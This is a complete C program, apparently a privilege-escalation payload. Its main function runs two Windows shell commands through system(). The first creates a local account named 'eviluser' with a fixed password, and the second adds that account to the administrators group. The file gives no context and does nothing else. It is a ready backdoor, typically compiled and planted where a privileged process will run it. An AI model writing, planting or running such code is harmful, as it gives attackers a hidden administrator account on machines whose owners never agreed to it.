#include <stdlib.h>

int main ()
{
  int  i;

  i = system ("net user eviluser password123! /add");
  i = system ("net localgroup administrators eviluser /add");

  return 0;
}
